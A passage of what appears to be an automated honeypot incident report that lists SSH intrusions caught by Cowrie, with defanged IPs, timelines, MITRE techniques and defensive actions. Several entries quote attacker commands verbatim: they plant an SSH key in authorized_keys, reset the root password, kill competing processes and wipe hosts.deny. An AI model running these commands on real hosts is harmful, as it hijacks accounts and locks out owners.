| `2026-06-15 01:22:41` | `cowrie.client.kex` |
| `2026-06-15 01:22:41` | `cowrie.login.success` |
| `2026-06-15 01:22:42` | `cowrie.session.params` |
| `2026-06-15 01:22:42` | `cowrie.command.input` |
| `2026-06-15 01:22:42` | `cowrie.command.failed` |
| `2026-06-15 01:22:42` | `cowrie.log.closed` |
| `2026-06-15 01:22:42` | `cowrie.session.params` |
| `2026-06-15 01:22:42` | `cowrie.command.input` |
| `2026-06-15 01:22:42` | `cowrie.session.file_download` |
| `2026-06-15 01:22:42` | `cowrie.log.closed` |
| `2026-06-15 01:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aa8ed2de479

| Field | Detail |
|---|---|
| **Source IP** | `151.33.34[.]75` |
| **First Seen** | 2026-06-15 01:22 |
| **Last Seen** | 2026-06-15 01:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:22:52` | `cowrie.session.connect` |
| `2026-06-15 01:22:52` | `cowrie.client.version` |
| `2026-06-15 01:22:52` | `cowrie.client.kex` |
| `2026-06-15 01:22:52` | `cowrie.login.success` |
| `2026-06-15 01:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.33.34[.]75` to AbuseIPDB if not already reported
- [ ] Block `151.33.34[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca429eca325

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:25 |
| **Last Seen** | 2026-06-15 01:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:25:14` | `cowrie.session.connect` |
| `2026-06-15 01:25:14` | `cowrie.client.version` |
| `2026-06-15 01:25:14` | `cowrie.client.kex` |
| `2026-06-15 01:25:15` | `cowrie.login.success` |
| `2026-06-15 01:25:15` | `cowrie.session.params` |
| `2026-06-15 01:25:15` | `cowrie.command.input` |
| `2026-06-15 01:25:15` | `cowrie.command.failed` |
| `2026-06-15 01:25:15` | `cowrie.log.closed` |
| `2026-06-15 01:25:15` | `cowrie.session.params` |
| `2026-06-15 01:25:15` | `cowrie.command.input` |
| `2026-06-15 01:25:15` | `cowrie.session.file_download` |
| `2026-06-15 01:25:15` | `cowrie.log.closed` |
| `2026-06-15 01:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7365a81ed9b

| Field | Detail |
|---|---|
| **Source IP** | `122.168.194[.]41` |
| **First Seen** | 2026-06-15 01:25 |
| **Last Seen** | 2026-06-15 01:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:25:17` | `cowrie.session.connect` |
| `2026-06-15 01:25:17` | `cowrie.client.version` |
| `2026-06-15 01:25:17` | `cowrie.client.kex` |
| `2026-06-15 01:25:17` | `cowrie.login.success` |
| `2026-06-15 01:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.194[.]41` to AbuseIPDB if not already reported
- [ ] Block `122.168.194[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7bb10a877f

| Field | Detail |
|---|---|
| **Source IP** | `118.253.182[.]187` |
| **First Seen** | 2026-06-15 01:29 |
| **Last Seen** | 2026-06-15 01:29 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:qLaeqfDNQRkl"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:29:05` | `cowrie.session.connect` |
| `2026-06-15 01:29:05` | `cowrie.client.version` |
| `2026-06-15 01:29:05` | `cowrie.client.kex` |
| `2026-06-15 01:29:05` | `cowrie.login.success` |
| `2026-06-15 01:29:06` | `cowrie.session.params` |
| `2026-06-15 01:29:06` | `cowrie.command.input` |
| `2026-06-15 01:29:06` | `cowrie.command.failed` |
| `2026-06-15 01:29:06` | `cowrie.log.closed` |
| `2026-06-15 01:29:06` | `cowrie.session.params` |
| `2026-06-15 01:29:06` | `cowrie.command.input` |
| `2026-06-15 01:29:06` | `cowrie.session.file_download` |
| `2026-06-15 01:29:06` | `cowrie.log.closed` |
| `2026-06-15 01:29:35` | `cowrie.session.params` |
| `2026-06-15 01:29:35` | `cowrie.command.input` |
| `2026-06-15 01:29:36` | `cowrie.log.closed` |
| `2026-06-15 01:29:36` | `cowrie.session.params` |
| `2026-06-15 01:29:36` | `cowrie.command.input` |
| `2026-06-15 01:29:36` | `cowrie.log.closed` |
| `2026-06-15 01:29:36` | `cowrie.session.params` |
| `2026-06-15 01:29:36` | `cowrie.command.input` |
| `2026-06-15 01:29:36` | `cowrie.session.file_download` |
| `2026-06-15 01:29:36` | `cowrie.log.closed` |
| `2026-06-15 01:29:37` | `cowrie.session.params` |
| `2026-06-15 01:29:37` | `cowrie.command.input` |
| `2026-06-15 01:29:37` | `cowrie.log.closed` |
| `2026-06-15 01:29:37` | `cowrie.session.params` |
| `2026-06-15 01:29:37` | `cowrie.command.input` |
| `2026-06-15 01:29:37` | `cowrie.log.closed` |
| `2026-06-15 01:29:38` | `cowrie.session.params` |
| `2026-06-15 01:29:38` | `cowrie.command.input` |
| `2026-06-15 01:29:38` | `cowrie.command.input` |
| `2026-06-15 01:29:38` | `cowrie.log.closed` |
| `2026-06-15 01:29:38` | `cowrie.session.params` |
| `2026-06-15 01:29:38` | `cowrie.command.input` |
| `2026-06-15 01:29:38` | `cowrie.log.closed` |
| `2026-06-15 01:29:38` | `cowrie.session.params` |
| `2026-06-15 01:29:38` | `cowrie.command.input` |
| `2026-06-15 01:29:39` | `cowrie.log.closed` |
| `2026-06-15 01:29:39` | `cowrie.session.params` |
| `2026-06-15 01:29:39` | `cowrie.command.input` |
| `2026-06-15 01:29:39` | `cowrie.log.closed` |
| `2026-06-15 01:29:39` | `cowrie.session.params` |
| `2026-06-15 01:29:39` | `cowrie.command.input` |
| `2026-06-15 01:29:40` | `cowrie.log.closed` |
| `2026-06-15 01:29:40` | `cowrie.session.params` |
| `2026-06-15 01:29:40` | `cowrie.command.input` |
| `2026-06-15 01:29:40` | `cowrie.log.closed` |
| `2026-06-15 01:29:40` | `cowrie.session.params` |
| `2026-06-15 01:29:40` | `cowrie.command.input` |
| `2026-06-15 01:29:40` | `cowrie.log.closed` |
| `2026-06-15 01:29:41` | `cowrie.session.params` |
| `2026-06-15 01:29:41` | `cowrie.command.input` |
| `2026-06-15 01:29:41` | `cowrie.log.closed` |
| `2026-06-15 01:29:41` | `cowrie.session.params` |
| `2026-06-15 01:29:41` | `cowrie.command.input` |
| `2026-06-15 01:29:41` | `cowrie.log.closed` |
| `2026-06-15 01:29:42` | `cowrie.session.params` |
| `2026-06-15 01:29:42` | `cowrie.command.input` |
| `2026-06-15 01:29:42` | `cowrie.log.closed` |
| `2026-06-15 01:29:42` | `cowrie.session.params` |
| `2026-06-15 01:29:42` | `cowrie.command.input` |
| `2026-06-15 01:29:42` | `cowrie.log.closed` |
| `2026-06-15 01:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.253.182[.]187` to AbuseIPDB if not already reported
- [ ] Block `118.253.182[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-977a23af0b90

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-06-15 01:33 |
| **Last Seen** | 2026-06-15 01:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:33:08` | `cowrie.session.connect` |
| `2026-06-15 01:33:08` | `cowrie.client.version` |
| `2026-06-15 01:33:08` | `cowrie.client.kex` |
| `2026-06-15 01:33:09` | `cowrie.login.success` |
| `2026-06-15 01:33:09` | `cowrie.session.params` |
| `2026-06-15 01:33:09` | `cowrie.command.input` |
| `2026-06-15 01:33:09` | `cowrie.command.failed` |
| `2026-06-15 01:33:10` | `cowrie.log.closed` |
| `2026-06-15 01:33:10` | `cowrie.session.params` |
| `2026-06-15 01:33:10` | `cowrie.command.input` |
| `2026-06-15 01:33:11` | `cowrie.session.file_download` |
| `2026-06-15 01:33:11` | `cowrie.log.closed` |
| `2026-06-15 01:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5697a67f1a2f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-06-15 01:33 |
| **Last Seen** | 2026-06-15 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:33:17` | `cowrie.session.connect` |
| `2026-06-15 01:33:17` | `cowrie.client.version` |
| `2026-06-15 01:33:17` | `cowrie.client.kex` |
| `2026-06-15 01:33:19` | `cowrie.login.success` |
| `2026-06-15 01:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbea832f30e3

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-06-15 01:34 |
| **Last Seen** | 2026-06-15 01:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:34:05` | `cowrie.session.connect` |
| `2026-06-15 01:34:05` | `cowrie.client.version` |
| `2026-06-15 01:34:05` | `cowrie.client.kex` |
| `2026-06-15 01:34:06` | `cowrie.login.success` |
| `2026-06-15 01:34:06` | `cowrie.session.params` |
| `2026-06-15 01:34:06` | `cowrie.command.input` |
| `2026-06-15 01:34:06` | `cowrie.command.failed` |
| `2026-06-15 01:34:06` | `cowrie.log.closed` |
| `2026-06-15 01:34:07` | `cowrie.session.params` |
| `2026-06-15 01:34:07` | `cowrie.command.input` |
| `2026-06-15 01:34:08` | `cowrie.session.file_download` |
| `2026-06-15 01:34:08` | `cowrie.log.closed` |
| `2026-06-15 01:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-020a5f0d4382

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-06-15 01:34 |
| **Last Seen** | 2026-06-15 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:34:13` | `cowrie.session.connect` |
| `2026-06-15 01:34:13` | `cowrie.client.version` |
| `2026-06-15 01:34:13` | `cowrie.client.kex` |
| `2026-06-15 01:34:14` | `cowrie.login.success` |
| `2026-06-15 01:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a6baea2280

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:34 |
| **Last Seen** | 2026-06-15 01:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:34:43` | `cowrie.session.connect` |
| `2026-06-15 01:34:43` | `cowrie.client.version` |
| `2026-06-15 01:34:43` | `cowrie.client.kex` |
| `2026-06-15 01:34:44` | `cowrie.login.success` |
| `2026-06-15 01:34:44` | `cowrie.session.params` |
| `2026-06-15 01:34:44` | `cowrie.command.input` |
| `2026-06-15 01:34:44` | `cowrie.command.failed` |
| `2026-06-15 01:34:45` | `cowrie.log.closed` |
| `2026-06-15 01:34:45` | `cowrie.session.params` |
| `2026-06-15 01:34:45` | `cowrie.command.input` |
| `2026-06-15 01:34:45` | `cowrie.session.file_download` |
| `2026-06-15 01:34:45` | `cowrie.log.closed` |
| `2026-06-15 01:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8cc947299a4

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-15 01:34 |
| **Last Seen** | 2026-06-15 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:34:47` | `cowrie.session.connect` |
| `2026-06-15 01:34:47` | `cowrie.client.version` |
| `2026-06-15 01:34:47` | `cowrie.client.kex` |
| `2026-06-15 01:34:48` | `cowrie.login.success` |
| `2026-06-15 01:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d738515c5851

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]144` |
| **First Seen** | 2026-06-15 01:35 |
| **Last Seen** | 2026-06-15 01:35 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XeBB7PwClvro"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 01:35:01` | `cowrie.session.connect` |
| `2026-06-15 01:35:01` | `cowrie.client.version` |
| `2026-06-15 01:35:01` | `cowrie.client.kex` |
| `2026-06-15 01:35:02` | `cowrie.login.success` |
| `2026-06-15 01:35:02` | `cowrie.session.params` |
| `2026-06-15 01:35:02` | `cowrie.command.input` |
| `2026-06-15 01:35:02` | `cowrie.command.failed` |
| `2026-06-15 01:35:02` | `cowrie.log.closed` |
| `2026-06-15 01:35:03` | `cowrie.session.params` |
| `2026-06-15 01:35:03` | `cowrie.command.input` |
| `2026-06-15 01:35:03` | `cowrie.session.file_download` |
| `2026-06-15 01:35:03` | `cowrie.log.closed` |
| `2026-06-15 01:35:15` | `cowrie.session.params` |
| `2026-06-15 01:35:15` | `cowrie.command.input` |
| `2026-06-15 01:35:15` | `cowrie.log.closed` |
| `2026-06-15 01:35:15` | `cowrie.session.params` |
| `2026-06-15 01:35:15` | `cowrie.command.input` |
| `2026-06-15 01:35:16` | `cowrie.log.closed` |
| `2026-06-15 01:35:16` | `cowrie.session.params` |
| `2026-06-15 01:35:16` | `cowrie.command.input` |
| `2026-06-15 01:35:16` | `cowrie.session.file_download` |
| `2026-06-15 01:35:16` | `cowrie.log.closed` |
| `2026-06-15 01:35:17` | `cowrie.session.params` |
| `2026-06-15 01:35:17` | `cowrie.command.input` |
| `2026-06-15 01:35:17` | `cowrie.log.closed` |
| `2026-06-15 01:35:17` | `cowrie.session.params` |
| `2026-06-15 01:35:17` | `cowrie.command.input` |
| `2026-06-15 01:35:17` | `cowrie.log.closed` |
| `2026-06-15 01:35:18` | `cowrie.session.params` |
| `2026-06-15 01:35:18` | `cowrie.command.input` |
| `2026-06-15 01:35:18` | `cowrie.command.input` |
| `2026-06-15 01:35:18` | `cowrie.log.closed` |
| `2026-06-15 01:35:18` | `cowrie.session.params` |
| `2026-06-15 01:35:18` | `cowrie.command.input` |
| `2026-06-15 01:35:18` | `cowrie.log.closed` |
| `2026-06-15 01:35:19` | `cowrie.session.params` |
| `2026-06-15 01:35:19` | `cowrie.command.input` |
| `2026-06-15 01:35:19` | `cowrie.log.closed` |
| `2026-06-15 01:35:19` | `cowrie.session.params` |
| `2026-06-15 01:35:19` | `cowrie.command.input` |
| `2026-06-15 01:35:19` | `cowrie.log.closed` |
| `2026-06-15 01:35:20` | `cowrie.session.params` |
| `2026-06-15 01:35:20` | `cowrie.command.input` |
| `2026-06-15 01:35:20` | `cowrie.log.closed` |
| `2026-06-15 01:35:20` | `cowrie.session.params` |
| `2026-06-15 01:35:20` | `cowrie.command.input` |
| `2026-06-15 01:35:20` | `cowrie.log.closed` |
| `2026-06-15 01:35:21` | `cowrie.session.params` |
| `2026-06-15 01:35:21` | `cowrie.command.input` |
| `2026-06-15 01:35:21` | `cowrie.log.closed` |
| `2026-06-15 01:35:21` | `cowrie.session.params` |
| `2026-06-15 01:35:21` | `cowrie.command.input` |
| `2026-06-15 01:35:21` | `cowrie.log.closed` |
| `2026-06-15 01:35:22` | `cowrie.session.params` |
| `2026-06-15 01:35:22` | `cowrie.command.input` |
| `2026-06-15 01:35:22` | `cowrie.log.closed` |
| `2026-06-15 01:35:22` | `cowrie.session.params` |
| `2026-06-15 01:35:22` | `cowrie.command.input` |
| `2026-06-15 01:35:22` | `cowrie.log.closed` |
| `2026-06-15 01:35:23` | `cowrie.session.params` |
| `2026-06-15 01:35:23` | `cowrie.command.input` |
| `2026-06-15 01:35:23` | `cowrie.log.closed` |
| `2026-06-15 01:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]144` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90db71ea12ba

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:05 |
| **Last Seen** | 2026-06-15 02:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:05:06` | `cowrie.session.connect` |
| `2026-06-15 02:05:06` | `cowrie.client.version` |
| `2026-06-15 02:05:06` | `cowrie.client.kex` |
| `2026-06-15 02:05:07` | `cowrie.login.success` |
| `2026-06-15 02:05:07` | `cowrie.session.params` |
| `2026-06-15 02:05:07` | `cowrie.command.input` |
| `2026-06-15 02:05:07` | `cowrie.command.failed` |
| `2026-06-15 02:05:08` | `cowrie.log.closed` |
